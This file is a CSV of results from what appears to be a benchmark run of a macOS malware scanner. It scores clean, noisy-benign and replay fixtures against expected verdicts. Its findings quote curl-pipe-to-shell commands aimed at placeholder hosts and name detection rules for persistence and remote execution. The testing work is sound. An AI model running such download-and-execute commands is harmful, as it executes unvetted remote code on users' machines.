run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-11T11-03-17Z-0aeca4","clean_plist_launchagent_template_01","clean","plist","file_fixture","clean/plist/clean_plist_launchagent_template_01.plist","plist","20","clean","clean","0","18","true","false","score_too_high","completed","","544","2026-03-11T11:03:21.111Z","true","","该样本规则 config.rule.file.intel.url.known_malicious_host 命中，按上下文归一化后计入风险。；规则 intel.url.known_malicious_host 命中，按上下文归一化后计入风险。。综合评分 20/100，判定 Clean（低风险）。","20","Threat intel matched 1 unified rules | Hash rules are always evaluated for every file | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Suspicious keywords: url:www.apple.com | Threat intel [url] hit: www.apple.com | No dedicated analyzer for plist. Fallback to generic analyzer. | generic_partial: No dedicated analyzer for plist. Fallback to generic analyzer."
"2026-03-11T11-03-17Z-0aeca4","clean_python_config_rw_02","clean","python","file_fixture","clean/python/clean_python_config_rw_02.py","pythonScript","0","clean","clean","0","12","true","true","","completed","","296","2026-03-11T11:03:21.408Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_python_directory_scan_01","clean","python","file_fixture","clean/python/clean_python_directory_scan_01.py","pythonScript","0","clean","clean","0","10","true","true","","completed","","261","2026-03-11T11:03:21.669Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_python_log_rotate_01","clean","python","file_fixture","clean/python/clean_python_log_rotate_01.py","pythonScript","0","clean","clean","0","15","true","true","","completed","","278","2026-03-11T11:03:21.948Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_python_subprocess_safe_01","clean","python","file_fixture","clean/python/clean_python_subprocess_safe_01.py","pythonScript","10","clean","clean","5","18","true","true","","completed","","255","2026-03-11T11:03:22.204Z","true","","该样本规则 python.subprocess_exec 命中，按上下文归一化后计入风险。。综合评分 10/100，判定 Clean（低风险）。","10","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(cmd, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","clean_python_text_summary_01","clean","python","file_fixture","clean/python/clean_python_text_summary_01.py","pythonScript","0","clean","clean","0","8","true","true","","completed","","276","2026-03-11T11:03:22.480Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_shell_backup_01","clean","shell","file_fixture","clean/shell/clean_shell_backup_01.sh","shellScript","0","clean","clean","0","15","true","true","","completed","","255","2026-03-11T11:03:22.736Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_shell_backup_02","clean","shell","file_fixture","clean/shell/clean_shell_backup_02.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","293","2026-03-11T11:03:23.029Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_shell_log_archive_01","clean","shell","file_fixture","clean/shell/clean_shell_log_archive_01.sh","shellScript","0","clean","clean","0","12","true","true","","completed","","296","2026-03-11T11:03:23.326Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","clean_shell_open_safe_site_01","clean","shell","file_fixture","clean/shell/clean_shell_open_safe_site_01.sh","shellScript","20","clean","clean","0","8","true","false","score_too_high","completed","","223","2026-03-11T11:03:23.550Z","true","","该样本规则 config.rule.file.intel.url.known_malicious_host 命中，按上下文归一化后计入风险。；规则 intel.url.known_malicious_host 命中，按上下文归一化后计入风险。。综合评分 20/100，判定 Clean（低风险）。","20","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L4-4 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","clean_shell_write_test_plist_01","clean","shell","file_fixture","clean/shell/clean_shell_write_test_plist_01.sh","shellScript","20","clean","clean","0","14","true","false","score_too_high","completed","","293","2026-03-11T11:03:23.843Z","true","","该样本规则 config.rule.file.intel.url.known_malicious_host 命中，按上下文归一化后计入风险。；规则 intel.url.known_malicious_host 命中，按上下文归一化后计入风险。。综合评分 20/100，判定 Clean（低风险）。","20","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L11-11 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_app_bundle_fixture_01","noisy_benign","app","app_bundle_fixture","noisy_benign/app/NoisyUtilityFixture_01.app","appBundle","10","clean","benign_noisy","12","30","true","false","score_too_low","completed","","1834","2026-03-11T11:03:25.677Z","true","","该样本样本可执行但未签名，来源可信度不足。。综合评分 10/100，判定 Clean（低风险）。","10","未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/noisy_benign/app/NoisyUtilityFixture_01.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-11T11-03-17Z-0aeca4","noisy_app_updater_manifest_01","noisy_benign","app","manifest_fixture","noisy_benign/app/noisy_app_updater_manifest_01.json","unknown","0","clean","benign_noisy","18","38","true","false","score_too_low","completed","","513","2026-03-11T11:03:26.191Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-11T11-03-17Z-0aeca4","noisy_applescript_admin_prompt_sim_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_admin_prompt_sim_01.applescript","appleScript","0","clean","benign_noisy","18","40","true","false","score_too_low","completed","","220","2026-03-11T11:03:26.412Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_applescript_finder_batch_rename_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_finder_batch_rename_01.applescript","appleScript","1","clean","benign_noisy","10","28","true","false","score_too_low","completed","","298","2026-03-11T11:03:26.711Z","true","","该样本规则 applescript.finder_control 命中，按上下文归一化后计入风险。。综合评分 1/100，判定 Clean（低风险）。","1","检测到脚本高风险行为特征 | [applescript.finder_control] 控制 Finder 行为 [low] L3-3 Δ8: tell application ""Finder"""
"2026-03-11T11-03-17Z-0aeca4","noisy_applescript_terminal_echo_pwd_01","noisy_benign","applescript","file_fixture","noisy_benign/applescript/noisy_applescript_terminal_echo_pwd_01.applescript","appleScript","2","clean","benign_noisy","12","30","true","false","score_too_low","completed","","219","2026-03-11T11:03:26.930Z","true","","该样本规则 applescript.terminal_control 命中，按上下文归一化后计入风险。。综合评分 2/100，判定 Clean（低风险）。","2","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-11T11-03-17Z-0aeca4","noisy_js_child_process_ls_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_child_process_ls_01.js","javaScript","11","clean","benign_noisy","12","30","true","false","score_too_low","completed","","252","2026-03-11T11:03:27.183Z","true","","该样本规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 11/100，判定 Clean（低风险）。","11","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_js_eval_math_only_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_eval_math_only_01.js","javaScript","15","clean","benign_noisy","15","35","true","true","","completed","","224","2026-03-11T11:03:27.407Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。。综合评分 15/100，判定 Clean（低风险）。","15","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L3-3 Δ22: const result = eval(expression); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_js_network_cache_text_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_network_cache_text_01.js","javaScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","319","2026-03-11T11:03:27.727Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_js_postinstall_sim_01","noisy_benign","js","file_fixture","noisy_benign/js/noisy_js_postinstall_sim_01.js","javaScript","80","malicious","benign_noisy","20","42","false","false","verdict_too_high","completed","","249","2026-03-11T11:03:27.976Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl https://example.invalid/pkg | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://example.invalid/pkg | sh | Threat intel [regexp] hit: curl https://example.invalid/pkg | Threat intel [regexp] hit: curl https://example.invalid/pkg | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_pkg_fixture_02","noisy_benign","pkg","pkg_directory_fixture","noisy_benign/pkg/noisy_pkg_fixture_02","pkg","0","clean","benign_noisy","15","35","true","false","score_too_low","completed","","327","2026-03-11T11:03:28.304Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","安装包包含 pre/post install 脚本 | 安装后可能修改路径：./benchmark/sandbox_output/pkg_install_target, /payload"
"2026-03-11T11-03-17Z-0aeca4","noisy_pkg_preinstall_sim_01","noisy_benign","pkg","file_fixture","noisy_benign/pkg/noisy_pkg_preinstall_sim_01.sh","shellScript","0","clean","benign_noisy","22","48","true","false","score_too_low","completed","","260","2026-03-11T11:03:28.564Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_python_build_subprocess_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_build_subprocess_01.py","pythonScript","10","clean","benign_noisy","12","28","true","false","score_too_low","completed","","248","2026-03-11T11:03:28.812Z","true","","该样本规则 python.subprocess_exec 命中，按上下文归一化后计入风险。。综合评分 10/100，判定 Clean（低风险）。","10","检测到混淆或编码逃逸 | [python.subprocess_exec] subprocess 外部进程执行 [high] L11-11 Δ20: result = subprocess.run(step, check=True, capture_output=True, text=True) | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_python_dynamic_loader_sim_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_dynamic_loader_sim_01.py","pythonScript","0","clean","benign_noisy","16","35","true","false","score_too_low","completed","","300","2026-03-11T11:03:29.113Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_python_remote_text_api_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_remote_text_api_01.py","pythonScript","0","clean","benign_noisy","14","32","true","false","score_too_low","completed","","246","2026-03-11T11:03:29.359Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_python_tempfile_cleanup_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_tempfile_cleanup_01.py","pythonScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","265","2026-03-11T11:03:29.625Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_python_updater_01","noisy_benign","python","file_fixture","noisy_benign/python/noisy_python_updater_01.py","pythonScript","0","clean","benign_noisy","20","45","true","false","score_too_low","completed","","290","2026-03-11T11:03:29.915Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_shell_appsupport_style_write_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_appsupport_style_write_01.sh","shellScript","0","clean","benign_noisy","10","24","true","false","score_too_low","completed","","261","2026-03-11T11:03:30.177Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_shell_base64_config_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_base64_config_01.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","275","2026-03-11T11:03:30.452Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_shell_chmod_tool_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_chmod_tool_01.sh","shellScript","0","clean","benign_noisy","10","26","true","false","score_too_low","completed","","259","2026-03-11T11:03:30.711Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","noisy_shell_installer_like_01","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_installer_like_01.sh","shellScript","69","malicious","benign_noisy","20","45","false","false","verdict_too_high","completed","","274","2026-03-11T11:03:30.986Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 69/100，判定 Malicious（高风险）。","69","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L8-8 Δ35: DANGEROUS_LOOKING_CMD='curl -fsSL https://example.invalid/installer.sh | bash' | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ14: curl -fssl https://example.invalid/installer.sh | bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.invalid/installer.sh | bash | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | Threat intel [regexp] hit: curl -fssl https://example.invalid/installer.sh | bash | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","noisy_shell_update_checker_02","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_update_checker_02.sh","shellScript","0","clean","benign_noisy","12","30","true","false","score_too_low","completed","","260","2026-03-11T11:03:31.246Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","replay_clean_app_lifecycle_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_app_lifecycle_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","6","2026-03-11T11:03:31.253Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T11-03-17Z-0aeca4","replay_clean_backup_flow_01","replay_clean","replay_json","replay_json","replay/clean/replay_clean_backup_flow_01.json","jsonReplay","0","unknown","clean","0","15","false","true","verdict_too_low","completed","","1","2026-03-11T11:03:31.255Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T11-03-17Z-0aeca4","replay_clean_js_fetch_cache_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_js_fetch_cache_02.json","jsonReplay","10","clean","","","","","","expectation_missing","completed","","2","2026-03-11T11:03:31.257Z","true","","Replay evaluation: clean (score 10)","10","[network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T11-03-17Z-0aeca4","replay_clean_pkg_appsupport_install_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_pkg_appsupport_install_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","2","2026-03-11T11:03:31.260Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T11-03-17Z-0aeca4","replay_clean_python_scan_report_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_python_scan_report_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","1","2026-03-11T11:03:31.262Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-11T11-03-17Z-0aeca4","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","75","malicious","","","","","","expectation_missing","completed","","3","2026-03-11T11:03:31.266Z","true","","Replay evaluation: malicious (score 75)","75","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T11-03-17Z-0aeca4","replay_malicious_app_osascript_chain_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_osascript_chain_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","4","2026-03-11T11:03:31.270Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T11-03-17Z-0aeca4","replay_malicious_chain_01","replay_malicious","replay_json","replay_json","replay/malicious/replay_malicious_chain_01.json","jsonReplay","100","malicious","malicious","85","100","true","true","","completed","","2","2026-03-11T11:03:31.272Z","true","","Replay evaluation: malicious (score 100)","110","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T11-03-17Z-0aeca4","replay_malicious_pkg_postinstall_multiegres_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_pkg_postinstall_multiegres_02.json","jsonReplay","95","malicious","","","","","","expectation_missing","completed","","4","2026-03-11T11:03:31.277Z","true","","Replay evaluation: malicious (score 95)","95","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T11-03-17Z-0aeca4","replay_malicious_python_subprocess_priv_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_python_subprocess_priv_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","3","2026-03-11T11:03:31.280Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T11-03-17Z-0aeca4","replay_suspicious_app_shell_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_app_shell_egress_02.json","jsonReplay","60","malicious","","","","","","expectation_missing","completed","","2","2026-03-11T11:03:31.282Z","true","","Replay evaluation: malicious (score 60)","60","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T11-03-17Z-0aeca4","replay_suspicious_persistence_attempt_01","replay_suspicious","replay_json","replay_json","replay/suspicious/replay_suspicious_persistence_attempt_01.json","jsonReplay","50","suspicious","suspicious","60","80","true","false","score_too_low","completed","","1","2026-03-11T11:03:31.284Z","true","","Replay evaluation: suspicious (score 50)","50","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
